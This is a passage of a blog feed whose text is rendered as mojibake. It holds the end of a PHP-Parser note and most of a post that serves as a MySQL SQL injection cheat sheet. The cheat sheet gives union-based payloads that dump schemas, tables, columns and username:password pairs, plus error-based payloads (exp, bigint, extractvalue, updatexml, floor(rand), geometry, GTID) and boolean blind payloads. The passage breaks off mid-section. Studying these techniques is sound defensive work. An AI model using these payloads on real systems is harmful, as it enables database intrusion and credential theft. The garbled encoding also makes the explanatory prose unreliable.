æ˜¯ä¸€ä¸ªä¿ç•™å…³é”®å­—ï¼Œè¯¥åº“ä¸­çš„è®¸å¤šèŠ‚ç‚¹ç±»åç§°éƒ½å¸¦æœ‰å°¾éš <code>_</code>ï¼Œä»¥é¿å…ä¸å…³é”®å­—å†²çªã€‚</p><p>å› ä¸º PHP æ˜¯ä¸€ç§å¤§å‹è¯­è¨€ï¼Œæ‰€ä»¥å¤§æ¦‚æœ‰140å¤šä¸ªä¸åŒçš„èŠ‚ç‚¹ï¼Œä¸ºäº†æ›´å¥½åœ°ä½¿ç”¨å®ƒä»¬ï¼Œå°†å®ƒä»¬åˆ†ä¸ºäº†ä¸‰ç±»ï¼š</p><ul><li><code>PhpParser\Node\Stmt</code> æ˜¯è¯­å¥èŠ‚ç‚¹ï¼Œå³ä¸è¿”å›å€¼å¹¶ä¸”ä¸èƒ½å‡ºç°åœ¨è¡¨è¾¾å¼ä¸­çš„è¯­è¨€æ„é€ ï¼Œä¾‹å¦‚ç±»å®šä¹‰å°±æ˜¯ä¸€ä¸ªè¯­å¥ï¼Œå› ä¸ºå®ƒæ²¡æœ‰è¿”å›å€¼æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½æ„é€ åƒ <code>func(class A &#123;&#125;);</code> è¿™æ ·çš„è¯­å¥</li></ul><ul><li><code>PhpParser\Node\Expr</code> æ˜¯è¡¨è¾¾å¼èŠ‚ç‚¹ï¼Œå³è¿”å›å€¼çš„è¯­è¨€æ„é€ ï¼Œå› æ­¤å¯ä»¥åœ¨å…¶ä»–è¡¨è¾¾å¼ä¸­å‡ºç°ï¼Œè¡¨è¾¾å¼çš„å®ä¾‹å¦‚ï¼š<ul><li><code>$var</code> (<code>PhpParser\Node\Expr\Variable</code>)</li><li><code>func()</code> (<code>PhpParser\Node\Expr\FuncCall</code>)</li></ul></li><li><code>PhpParser\Node\Scalar</code> æ˜¯è¡¨ç¤ºæ ‡é‡å€¼çš„èŠ‚ç‚¹ï¼Œæ¯”å¦‚ <code>&#39;string&#39;</code> (<code>PhpParser\Node\Scalar\String_</code>)ï¼Œ<code>0</code> (<code>PhpParser\Node\Scalar\LNumber</code>ï¼‰æˆ–è€…é­”æœ¯å¸¸æ•°æ¯”å¦‚ <code>__FILE__</code> (<code>PhpParser\Node\Scalar\MagicConst\File</code>)ï¼Œæ‰€æœ‰çš„<code>PhpParser\Node\Scalars</code>éƒ½æ‰©å±•äº†<code>PhpParser\Node\Expr</code>ï¼Œå› ä¸ºæ ‡é‡ä¹Ÿæ˜¯è¡¨è¾¾å¼ã€‚</li><li>è¿™ä¸¤ä¸ªç»„éƒ½ä¸å­˜åœ¨æŸäº›èŠ‚ç‚¹ï¼Œæ¯”å¦‚åç§°ï¼ˆ<code>PhpParser\Node\Name</code>ï¼‰å’Œè°ƒç”¨å‚æ•°ï¼ˆ<code>PhpParser\Node\Arg</code>ï¼‰çš„èŠ‚ç‚¹ã€‚</li></ul><p><code>Node\Stmt\Expression</code>èŠ‚ç‚¹æœ‰ç‚¹ä»¤äººè¿·æƒ‘ï¼Œå› ä¸ºå®ƒæ—¢æœ‰æœ¯è¯­ statement åˆæœ‰ expressionï¼Œè¿™ä¸ªèŠ‚ç‚¹æœ‰åˆ«äºè¢«ç§°ä¸º <code>Node\Expr</code> çš„ exprï¼Œæ˜¯ä¸€ä¸ªç”±è¡¨è¾¾å¼ <code>Node\Stmt\Expression</code> ä»£è¡¨çš„åŒ…å« expr ä½œä¸ºå­èŠ‚ç‚¹çš„ expression statementã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> PROJECT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°è°ˆSQLæ³¨å…¥</title>
      <link href="2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/"/>
      <url>2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>SQL æ³¨å…¥è¿™æ–¹é¢ä¸€ç›´æŒºèœçš„ï¼Œæ•´ç†ä¸€ä¸‹å§</p><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="Union-Based"><a href="#Union-Based" class="headerlink" title="Union Based"></a>Union Based</h2><h3 id="åˆ¤æ–­-column-æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®"><a href="#åˆ¤æ–­-column-æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®" class="headerlink" title="åˆ¤æ–­ column æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®"></a>åˆ¤æ–­ column æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®</h3><ul><li><code>order/group by N</code></li><li><code>union select 1,2,3...N</code></li></ul><hr><p>æ³¨æ„ï¼š</p><ul><li>è‹¥ç¡®å®šé¡µé¢æœ‰å›æ˜¾ï¼Œä½†æ˜¯é¡µé¢ä¸­å¹¶æ²¡æœ‰æˆ‘ä»¬å®šä¹‰çš„ç‰¹æ®Šæ ‡è®°æ•°å­—å‡ºç°ï¼Œå¯èƒ½æ˜¯é¡µé¢é™åˆ¶äº†å•è¡Œæ•°æ®è¾“å‡ºï¼Œæˆ‘ä»¬è®©å‰è¾¹çš„ select æŸ¥è¯¢æ¡ä»¶è¿”å›ç»“æœä¸ºç©ºå³å¯</li><li>æ³¨æ„ä¸€å®šè¦æ‹¼æ¥å¤Ÿè¶³å¤Ÿçš„å­—æ®µæ•°ï¼Œå¦åˆ™ SQL è¯­å¥æŠ¥é”™ã€‚PSï¼šæ­¤æ–¹æ³•ä¹Ÿå¯ä½œä¸ºåˆ¤æ–­å‰æ¡ select è¯­å¥çš„æ–¹æ³•ä¹‹ä¸€</li></ul><hr><h3 id="çˆ†åº“ã€è¡¨ã€å­—æ®µ"><a href="#çˆ†åº“ã€è¡¨ã€å­—æ®µ" class="headerlink" title="çˆ†åº“ã€è¡¨ã€å­—æ®µ"></a>çˆ†åº“ã€è¡¨ã€å­—æ®µ</h3><ul><li><p>MySQL version &lt; 5.0</p><ul><li><p>ç”±äº MySQL çš„ä½ç‰ˆæœ¬ç¼ºä¹ç³»ç»Ÿåº“<code>information_schema</code>ï¼Œæ•…é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥æŸ¥è¯¢è¡¨åï¼Œå­—æ®µï¼ˆåˆ—ï¼‰åç­‰ä¿¡æ¯</p><p>è¿™æ—¶å€™åªèƒ½é çŒœæ¥è§£å†³ï¼Œç›´æ¥çŒœè¡¨åä¸åˆ—åæ˜¯ä»€ä¹ˆï¼Œç”šè‡³æ˜¯åº“åï¼Œå†ä½¿ç”¨è”åˆæŸ¥è¯¢å–æ•°æ®</p><p>è‹¥çŸ¥é“ä»…è¡¨åè€Œä¸çŸ¥é“åˆ—ï¼ˆå­—æ®µï¼‰åï¼Œå¯ä»¥å°è¯•ï¼š</p><ul><li><p>å•å­—æ®µï¼š<code>select *,1,2,xxx from table_name</code></p></li><li><p>å¤šå­—æ®µï¼š<code>select x from(select 1,2,3,4,xxx from table_name union select * from table_name)a</code></p></li></ul></li></ul></li><li><p>MySQL version &gt;= 5.0</p><ul><li><p>çˆ† schema</p><ul><li><code>union select 1,2,schema_name from information_schema.schemata limit 1,1</code></li></ul></li><li><p>çˆ† table</p><ul><li><p><code>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</code></p></li><li><p><code>union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1</code></p></li></ul></li><li><p>çˆ† column</p><ul><li><code>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;Du1&#39;</code></li><li><code>union select 1,2,column_name from information_schema.columns where table_schema=database() limit 0,1</code></li></ul></li><li><p>å‡º</p><ul><li><code>select heart from Du1</code></li><li><code>SELECT CONCAT(username, &quot;:&quot; ,password) FROM Du1.USER</code></li></ul></li></ul></li></ul><h2 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h2><p>é€šè¿‡ç‰¹æ®Šå‡½æ•°çš„æŠ¥é”™ä½¿å…¶å‚æ•°è¢«é¡µé¢è¾“å‡º</p><hr><p>å‰æï¼š</p><ul><li>æœåŠ¡å™¨å¼€å¯æŠ¥é”™ä¿¡æ¯è¿”å›ï¼Œä¹Ÿå°±æ˜¯å‘ç”Ÿé”™è¯¯æ—¶è¿”å›æŠ¥é”™ä¿¡æ¯</li></ul><p>æ³¨æ„ï¼š</p><ul><li>æŠ¥é”™å‡½æ•°é€šå¸¸æœ‰æœ€é•¿æŠ¥é”™è¾“å‡ºçš„é™åˆ¶ï¼Œé¢å¯¹è¿™ç§æƒ…å†µï¼Œå¯ä»¥è¿›è¡Œåˆ†å‰²è¾“å‡º<ul><li><code>#define ERRMSGSIZE (512)</code></li></ul></li><li>ç‰¹æ®Šå‡½æ•°çš„ç‰¹æ®Šå‚æ•°è¿›è¿è¡Œä¸€ä¸ªå­—æ®µã€ä¸€è¡Œæ•°æ®çš„è¿”å›ï¼Œä½¿ç”¨ group_concat ç­‰å‡½æ•°èšåˆæ•°æ®å³å¯</li></ul><hr><h3 id="åˆ©ç”¨-overflow"><a href="#åˆ©ç”¨-overflow" class="headerlink" title="åˆ©ç”¨ overflow"></a>åˆ©ç”¨ overflow</h3><p>æ³¨ï¼šMySQL version &gt; 5.5.5 çš„æ—¶å€™ overflow æ‰ä¼šæœ‰é”™è¯¯è®¯æ¯ï¼ŒMySQL version &gt; 5.5.53 çš„æ—¶å€™ä¸ä¼šæ˜¾ç¤ºæŸ¥è¯¢ç»“æœ</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>é€‚ç”¨ç‰ˆæœ¬ï¼š5.5.49~5.5.5</p><p>è¯¥å‡½æ•°ä¼šè¿”å› e çš„ x æ¬¡æ–¹ç»“æœ</p><p>å› ä¸º MySQL èƒ½è®°å½•çš„ double æ•°å€¼èŒƒå›´æœ‰é™ï¼Œä¸€æ—¦ç»“æœè¶…è¿‡èŒƒå›´ï¼Œåˆ™è¯¥å‡½æ•°æŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT exp(709) &#x3D;&gt; 8.218407461554972e307</span><br><span class="line">SELECT exp(710) &#x3D;&gt; ERROR</span><br></pre></td></tr></table></figure><p>æ•…å¯ä½œ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT exp(~(SELECT * FROM (SELECT user())x));</span><br><span class="line">ERROR 1690(22003): DOUBLE value is out of range in &#39;exp(~((SELECT &#39;root@localhost&#39; FROM dual)))&#39;</span><br></pre></td></tr></table></figure><p>æŒ‰ç†æ¥è¯´ <code>pow</code> åº”è¯¥ä¹Ÿå¯ä»¥ï¼ŒåŸç†ç›¸åŒ</p><hr><h4 id="bigint-æ•°å€¼æ“ä½œ"><a href="#bigint-æ•°å€¼æ“ä½œ" class="headerlink" title="bigint æ•°å€¼æ“ä½œ"></a>bigint æ•°å€¼æ“ä½œ</h4><p>åˆ©ç”¨äº†å½“ MySQL æ•°æ®åº“çš„æŸäº›è¾¹ç•Œæ•°å€¼è¿›è¡Œæ•°å€¼è¿ç®—æ—¶ï¼Œä¼šæŠ¥é”™çš„åŸç†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT ~0 &#x3D;&gt; 18446744073709551615</span><br><span class="line">SELECT ~0 + 1 &#x3D;&gt; ERROR</span><br><span class="line">SELECT cot(0) &#x3D;&gt; ERROR</span><br><span class="line"></span><br><span class="line">select !(select * from(select user())a)-~0;</span><br><span class="line">select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#39;root@localhost&#39;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨-xpath"><a href="#åˆ©ç”¨-xpath" class="headerlink" title="åˆ©ç”¨ xpath"></a>åˆ©ç”¨ xpath</h3><h4 id="extractvalue-é•¿åº¦é™åˆ¶32ä½"><a href="#extractvalue-é•¿åº¦é™åˆ¶32ä½" class="headerlink" title="extractvalue (é•¿åº¦é™åˆ¶32ä½)"></a>extractvalue (é•¿åº¦é™åˆ¶32ä½)</h4><p>åŸç†ï¼šå‰åæ·»åŠ  ~ ä½¿å…¶ä¸ç¬¦åˆ xpath æ ¼å¼ä»è€ŒæŠ¥é”™</p><p>é€‚ç”¨ç‰ˆæœ¬ 5.1.5+</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br></pre></td></tr></table></figure><h4 id="updatexml-é•¿åº¦é™åˆ¶32ä½"><a href="#updatexml-é•¿åº¦é™åˆ¶32ä½" class="headerlink" title="updatexml (é•¿åº¦é™åˆ¶32ä½)"></a>updatexml (é•¿åº¦é™åˆ¶32ä½)</h4><p>é€‚ç”¨ç‰ˆæœ¬ 5.1.5+</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™-ä¸»é”®é‡å¤"><a href="#åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™-ä¸»é”®é‡å¤" class="headerlink" title="åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™ / ä¸»é”®é‡å¤"></a>åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™ / ä¸»é”®é‡å¤</h3><p>åŸç†ï¼šç®€å•æ¥è¯´ï¼Œæ˜¯ç”±äº where æ¡ä»¶æ¯æ‰§è¡Œä¸€æ¬¡ï¼Œrand å‡½æ•°å°±ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œå¦‚æœåœ¨ç”±äºåœ¨ç»Ÿè®¡æ•°æ®æ—¶åˆ¤æ–­ä¾æ®ä¸èƒ½åŠ¨æ€æ”¹å˜ï¼Œæ•… <code>rand()</code> ä¸èƒ½åæ¥åœ¨<code>order/group by</code> ä¸Š</p><hr><p>ä¸¾æ —å­ï¼š</p><p>å‡è®¾ USER è¡¨æœ‰ä¸‰æ¡æ•°æ®ï¼Œæˆ‘ä»¬é€šè¿‡ï¼š<code>select * from USER group by username</code> æ¥é€šè¿‡å…¶ä¸­çš„ username å­—æ®µè¿›è¡Œåˆ†ç»„</p><p>æ­¤è¿‡ç¨‹ä¼šå…ˆå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿè¡¨ï¼Œå­˜åœ¨ä¸¤ä¸ªå­—æ®µï¼š<code>keyï¼Œcount</code></p><p>å…¶ä¸­æˆ‘ä»¬é€šè¿‡ username æ¥åˆ¤æ–­ï¼Œå…¶åœ¨æ­¤å¤„æ˜¯å­—æ®µï¼Œé¦–å…ˆå…ˆå–ç¬¬ä¸€è¡Œçš„æ•°æ®ï¼š<code>username=Du1&amp;password=0312</code></p><p>username ä¸º Du1 å‡ºç°ä¸€æ¬¡ï¼Œåˆ™ç°åœ¨è™šè¡¨å†…æŸ¥è¯¢æ˜¯å¦å­˜åœ¨ Du1ï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™ count + 1ï¼Œè‹¥ä¸å­˜åœ¨ï¼Œåˆ™æ·»åŠ  Du1ï¼Œå…¶ count ä¸º 1</p><p>å¯¹äº<code>floor(rand(0)*2)</code>ï¼Œå…¶ä¸­<code>rand()</code>å‡½æ•°ï¼Œä¼šç”Ÿæˆ 0 ~ 1 ä¹‹é—´éšæœºä¸€ä¸ªå°æ•°ã€<code>floor()</code>å–æ•´æ•°éƒ¨åˆ†ã€0 æ˜¯éšæœºå› å­ã€ä¹˜ 2 æ˜¯ä¸ºäº†è®©å¤§äº 0.5 çš„å°æ•°é€šè¿‡ floor å‡½æ•°å¾— 1</p><p>è‹¥è¡¨ä¸­æœ‰ä¸‰è¡Œæ•°æ®ï¼šæˆ‘ä»¬é€šè¿‡<code>select * from USER group by floor(rand(0)*2)</code>è¿›è¡Œæ’åºçš„è¯</p><blockquote><p>æ³¨æ„ï¼š</p><p>ç”±äº<code>rand(0)</code>çš„éšæœºå› å­æ˜¯è¢«å›ºå®šçš„ï¼Œæ•…å…¶äº§ç”Ÿçš„éšæœºæ•°ä¹Ÿè¢«å›ºå®šäº†ï¼Œé¡ºåºä¸ºï¼š011011â€¦â€¦</p></blockquote><p>é¦–å…ˆ<code>group by</code>éœ€è¦æ‰§è¡Œçš„è¯ï¼Œéœ€è¦ç¡®å®šåˆ†ç»„å› å­ï¼Œæ•…<code>floor(rand(0)*2)</code>è¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå¾—åˆ°çš„ç»“æœä¸º 0ï¼Œæ¥ç€åœ¨è™šè¡¨å†…æ£€ç´¢ 0ï¼Œå‘ç°è™šè¡¨æ²¡æœ‰é”®å€¼ä¸º 0 çš„è®°å½•ï¼Œæ•…æ·»åŠ ä¸Šï¼Œåœ¨è¿›è¡Œæ·»åŠ æ—¶ï¼š<code>floor(rand(0)*2)</code>ç¬¬äºŒæ¬¡è¢«æ‰§è¡Œï¼Œå¾—åˆ°ç»“æœ 1ï¼Œäºæ˜¯è™šæ‹Ÿè¡¨æ’å…¥çš„å†…å®¹ä¸º<code>key=1&amp;count=1</code></p><p>ç¬¬äºŒæ¬¡æ‰§è¡Œ<code>group by</code>æ—¶ï¼š<code>floor(rand(0)*2)</code>å…ˆè¢«è¿è¡Œä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸‰æ¬¡è¿è¡Œã€‚å¾—åˆ°ç»“æœ 1ï¼ŒæŸ¥è¯¢è™šè¡¨å‘ç°æ•°æ®å­˜åœ¨ï¼Œå› è€Œç›´æ¥è®©è™šè¡¨å†…çš„<code>key=1</code>çš„ count åŠ ä¸€å³å¯ï¼Œ<code>floor(..)</code>åªè¿è¡Œäº†ä¸€æ¬¡</p><p>ç¬¬ä¸‰æ¬¡æ‰§è¡Œ<code>group by</code>æ—¶ï¼Œ<code>floor(rand(0)*2)</code>è¢«æ‰§è¡Œç¬¬å››æ¬¡ï¼Œå¾—åˆ°ç»“æœ 0ï¼ŒæŸ¥è¯¢è™šè¡¨ä¸å­˜åœ¨ã€‚å†æ’å…¥è™šè¡¨æ—¶ï¼Œ<code>floor(â€¦)</code>è¢«æ‰§è¡Œç¬¬äº”æ¬¡ï¼Œå¾—åˆ°ç»“æœ 1ï¼Œæ•…æ­¤æ—¶è™šè¡¨å°†æ’å…¥çš„å€¼ä¸º<code>key=1&amp;count=1</code>ï¼Œæ³¨æ„ï¼Œæ­¤æ—¶è™šè¡¨å·²æœ‰ä¸€æ¡è®°å½•ä¸ºï¼š<code>key=1&amp;count=2</code>ï¼Œå¹¶ä¸”å­—æ®µ key ä¸ºä¸»é”®ï¼Œå…·æœ‰ä¸å¯é‡å¤æ€§ï¼Œæ•…è™šè¡¨åœ¨å°è¯•æ’å…¥æ—¶å°†äº§ç”Ÿé”™è¯¯</p><hr><p>æ•…å¯ä½œ payloadï¼š<code>union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code></p><p><img src="https://i.loli.net/2021/04/26/zfHIm7y31G5MsZU.png"></p><p><code>select count(*) from test group by concat(version(),floor(rand(0)*2));</code></p><p><img src="https://i.loli.net/2021/04/26/R6EMWit5lazIePC.png"></p><h3 id="åˆ©ç”¨å‡ ä½•å‡½æ•°"><a href="#åˆ©ç”¨å‡ ä½•å‡½æ•°" class="headerlink" title="åˆ©ç”¨å‡ ä½•å‡½æ•°"></a>åˆ©ç”¨å‡ ä½•å‡½æ•°</h3><ul><li>GeometryCollectionï¼š<code>id=1 AND GeometryCollection((select * from (select* from(select user())a)b))</code></li><li>polygonï¼š<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li><li>multipointï¼š<code>id=1 AND multipoint((select * from(select * from(select user())a)b))</code></li><li>multilinestringï¼š<code>id=1 AND multilinestring((select * from(select * from(select user())a)b))</code></li><li>linestringï¼š<code>id=1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li><li>multipolygonï¼š<code>id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></li></ul><h3 id="åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°"><a href="#åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°" class="headerlink" title="åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°"></a>åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°</h3><p>éšä¾¿ç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œå¯èƒ½ä¼šæ‘¸å¥–å¾—åˆ°å½“å‰æ‰€åœ¨çš„æ•°æ®åº“åç§°</p><p><img src="https://i.loli.net/2021/04/26/UCKcN46HYWITbBu.png"></p><h3 id="åˆ©ç”¨-name-const"><a href="#åˆ©ç”¨-name-const" class="headerlink" title="åˆ©ç”¨ name_const"></a>åˆ©ç”¨ name_const</h3><p>ä»…å¯å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯</p><p>payloadï¼š<code>select * from(select name_const(version(),0x1),name_const(version(),0x1))a</code></p><p><img src="https://i.loli.net/2021/04/26/XhTW5evptx8EHnC.png"></p><h3 id="uuid-ç›¸å…³å‡½æ•°"><a href="#uuid-ç›¸å…³å‡½æ•°" class="headerlink" title="uuid ç›¸å…³å‡½æ•°"></a>uuid ç›¸å…³å‡½æ•°</h3><p>é€‚ç”¨ç‰ˆæœ¬ï¼š8.0.x</p><p>because of å‚æ•°æ ¼å¼ä¸æ­£ç¡®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT UUID_TO_BIN((SELECT password FROM users WHERE id&#x3D;1));</span><br><span class="line">SELECT BIN_TO_UUID((SELECT password FROM users WHERE id&#x3D;1));</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªğŸ‘´è¿˜æ²¡æµ‹</p><h3 id="GTID-ç›¸å…³å‡½æ•°"><a href="#GTID-ç›¸å…³å‡½æ•°" class="headerlink" title="GTID ç›¸å…³å‡½æ•°"></a>GTID ç›¸å…³å‡½æ•°</h3><p>åŒæ ·ä¹Ÿæ˜¯å‚æ•°æ ¼å¼ä¸æ­£ç¡®ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select gtid_subset(user(),1);</span><br><span class="line">select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);</span><br><span class="line">select gtid_subtract((select * from(select user())a),1);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/AxWCeFVRBES7plz.png"></p><h3 id="join-using-æ³¨åˆ—å"><a href="#join-using-æ³¨åˆ—å" class="headerlink" title="join using æ³¨åˆ—å"></a>join using æ³¨åˆ—å</h3><p>é€šè¿‡ç³»ç»Ÿå…³é”®è¯ join å¯å»ºç«‹ä¸¤ä¸ªè¡¨ä¹‹é—´çš„å†…è¿æ¥ï¼Œé€šè¿‡å¯¹æƒ³è¦æŸ¥è¯¢åˆ—åçš„è¡¨ä¸å…¶è‡ªèº«å»ºç«‹å†…è¿æ¥ï¼Œä¼šç”±äºå†—ä½™çš„åŸå› ï¼ˆç›¸åŒåˆ—åå­˜åœ¨ï¼‰è€Œå‘ç”Ÿé”™è¯¯ï¼Œå¹¶ä¸”æŠ¥é”™ä¿¡æ¯ä¼šå­˜åœ¨é‡å¤çš„åˆ—åï¼Œå¯ä»¥ä½¿ç”¨ USING è¡¨è¾¾å¼å£°æ˜å†…è¿æ¥ï¼ˆINNER JOINï¼‰æ¡ä»¶æ¥é¿å…æŠ¥é”™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from users a join (select * from users)b)c;</span><br><span class="line">select * from(select * from users a join (select * from users)b using(username))c;</span><br><span class="line">select * from(select * from users a join (select * from users)b using(username,password))c</span><br></pre></td></tr></table></figure><p>ğŸ‘´ä¸å’‹æ‡‚ï¼Œå¸Œæœ›å“ªä½SQLğŸ‘´å¯ä»¥å¸¦å¸¦ğŸ‘´</p><h3 id="ST-ç›¸å…³å‡½æ•°"><a href="#ST-ç›¸å…³å‡½æ•°" class="headerlink" title="ST ç›¸å…³å‡½æ•°"></a>ST ç›¸å…³å‡½æ•°</h3><p>MySQL 5.7</p><ul><li><code>select ST_LatFromGeoHash(version());</code></li><li><code>select ST_LongFromGeoHash(version());</code></li><li><code>select ST_PointFromGeoHash(version(),1);</code></li></ul><p><img src="https://i.loli.net/2021/04/26/hmOj8uBfU2PEiRq.png"></p><hr><h3 id="æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨"><a href="#æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨" class="headerlink" title="æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨"></a>æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨</h3><p>æ³¨ï¼šé»˜è®¤MYSQL_ERRMSG_SIZE=512</p><table><thead><tr><th>ç±»åˆ«</th><th>å‡½æ•°</th><th>ç‰ˆæœ¬éœ€æ±‚</th><th>5.5.x</th><th>5.6.x</th><th>5.7.x</th><th>8.x</th><th>å‡½æ•°æ˜¾é”™é•¿åº¦</th><th>MysqlæŠ¥é”™å†…å®¹é•¿åº¦</th><th>é¢å¤–é™åˆ¶</th></tr></thead><tbody><tr><td>ä¸»é”®é‡å¤</td><td>floor round</td><td>â“</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td></td><td>64</td><td></td><td>data_type â‰  varchar</td></tr><tr><td>åˆ—åé‡å¤</td><td>name_const</td><td>â“</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td></td><td></td><td>only version()</td></tr><tr><td></td><td>join</td><td>[5.5.49, ?)</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td></td><td></td><td>only columns</td></tr><tr><td>æ•°æ®æº¢å‡º - Double</td><td>1e308 cot exp pow</td><td>[5.5.5, 5.5.48]</td><td>âœ”ï¸</td><td></td><td></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>æ•°æ®æº¢å‡º - BIGINT</td><td></td><td>[5.5.5, 5.5.48]</td><td>âœ”ï¸</td><td></td><td></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>å‡ ä½•å¯¹è±¡</td><td>geometrycollection linestring multipoint multipolygon multilinestring polygon</td><td>[?, 5.5.48]</td><td>âœ”ï¸</td><td></td><td></td><td></td><td></td><td>244</td><td></td></tr><tr><td>ç©ºé—´å‡½æ•° Geohash</td><td>ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td><td>[5.7, ?)</td><td></td><td></td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>128</td><td></td><td></td></tr><tr><td>GTID</td><td>gtid_subset gtid_subtract</td><td>[5.6.5, ?)</td><td></td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>200</td><td></td><td></td></tr><tr><td>JSON</td><td>json_*</td><td>[5.7.8, 5.7.11]</td><td></td><td></td><td>âœ”ï¸</td><td></td><td>200</td><td></td><td></td></tr><tr><td>UUID</td><td>uuid_to_bin bin_to_uuid</td><td>[8.0, ?)</td><td></td><td></td><td></td><td>âœ”ï¸</td><td>128</td><td></td><td></td></tr><tr><td>XPath</td><td>extractvalue updatexml</td><td>[5.1.5, ?)</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>32</td><td></td><td></td></tr></tbody></table><p>æ‘˜è‡ªâ€”â€”<a href="https://blog.sari3l.com/posts/9622f295/">Mysql æ³¨å…¥åŸºç¡€å°ç»“</a></p><hr><h2 id="Blind-Based"><a href="#Blind-Based" class="headerlink" title="Blind Based"></a>Blind Based</h2><h3 id="Booleanï¼ˆ1-or-0ï¼‰"><a href="#Booleanï¼ˆ1-or-0ï¼‰" class="headerlink" title="Booleanï¼ˆ1 or 0ï¼‰"></a>Booleanï¼ˆ1 or 0ï¼‰</h3><ul><li><code>id=87 and length(user())&gt;0</code></li><li><code>id=87 and length(user())&gt;100</code></li><li><code>id=87 and ascii(mid(user(),1,1))&gt;100</code></li><li><code>id=87 or ((select user()) regexp binary &#39;^[a-z]&#39;)</code></li></ul><h3 id="Timeï¼ˆæ— å›æ˜¾ï¼‰"><a href="#Timeï¼ˆæ— å›æ˜¾ï¼‰" class="headerlink" title="Timeï¼ˆæ— 